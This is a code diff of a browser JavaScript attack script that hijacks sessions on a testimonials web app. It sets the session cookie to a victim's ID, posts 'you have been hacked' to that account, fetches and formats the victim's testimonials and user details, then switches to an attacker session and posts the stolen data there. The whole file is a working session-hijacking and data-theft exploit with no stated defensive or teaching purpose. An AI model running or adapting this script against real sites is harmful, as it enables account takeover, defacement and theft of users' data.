@@ -1,10 +1,32 @@
 (async function stealAndPostVictimData() {
     
-    console.log("🚀 Fetching victim data from session 1369...");
+    console.log("🚀 Starting attack on session 1410...");
 
-    // Force Victim Session
-    document.cookie = "session=1369; path=/";
-    await new Promise(r => setTimeout(r, 500));
+    // ====================== 1. POST "you have been hacked" to Victim (1410) ======================
+    document.cookie = "session=1410; path=/";
+    await new Promise(r => setTimeout(r, 400));
+
+    console.log("📤 Posting 'you have been hacked' to session 1410...");
+
+    await fetch('/api/testimonials', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': '*/*'
+        },
+        credentials: 'include',
+        body: JSON.stringify({ 
+            content: "you have been hacked" 
+        })
+    })
+    .then(r => console.log("Initial POST Status:", r.status))
+    .catch(err => console.error("Initial POST Error:", err));
+
+    // Small delay
+    await new Promise(r => setTimeout(r, 800));
+
+    // ====================== 2. FETCH All Victim Data (1410) ======================
+    console.log("📥 Fetching all testimonials from session 1410...");
 
     let victimTestimonials = [];
 
@@ -16,12 +38,13 @@
 
         if (res.ok) {
             victimTestimonials = await res.json();
+            console.log(`✅ Fetched ${Array.isArray(victimTestimonials) ? victimTestimonials.length : 1} testimonial(s)`);
         }
     } catch (e) {
         console.error("Fetch failed", e);
     }
 
-    // Format all victim data nicely
+    // Format victim data
     let victimFormatted = "";
 
     if (Array.isArray(victimTestimonials) && victimTestimonials.length > 0) {
@@ -34,7 +57,6 @@
                    `User Name: ${item.user_name || "N/A"}\n`;
         }).join("\n\n");
     } else if (victimTestimonials) {
-        // Single object case
         const item = victimTestimonials;
         victimFormatted = `=== VICTIM TESTIMONIAL ===\n` +
                          `UUID     : ${item.uuid || "N/A"}\n` +
@@ -44,18 +66,18 @@
                          `User Name: ${item.user_name || "N/A"}\n`;
     }
 
-    const finalContent = `🚨 STOLEN TESTIMONIALS FROM VICTIM\n\n` + 
+    const finalContent = `🚨 STOLEN TESTIMONIALS FROM VICTIM (1410)\n\n` + 
                         victimFormatted + 
                         `\n\n=== END OF VICTIM DATA ===`;
 
-    console.log("\n📋 Final Content that will be posted to 1333:\n");
+    console.log("\n📋 Final Content to be posted to 1409:\n");
     console.log(finalContent);
 
-    // ====================== POST TO ATTACKER (1333) ======================
-    document.cookie = "session=1333; path=/";
+    // ====================== 3. POST to Attacker Session (1409) ======================
+    document.cookie = "session=1409; path=/";
     await new Promise(r => setTimeout(r, 600));
 
-    console.log("📤 Posting victim data to session=1333...");
+    console.log("📤 Posting stolen victim data to session=1409...");
 
     await fetch('/api/testimonials', {
         method: 'POST',
@@ -69,9 +91,9 @@
         })
     })
     .then(r => r.text())
-    .then(text => console.log("✅ Posted Successfully | Status:", "OK"))
+    .then(text => console.log("✅ Successfully posted to 1409"))
     .catch(err => console.error("POST Error:", err));
 
-    console.log("🎯 All victim testimonials transferred to your session (1333)");
+    console.log("🎯 Attack Completed! Data transferred from 1410 to 1409");
 
 })();
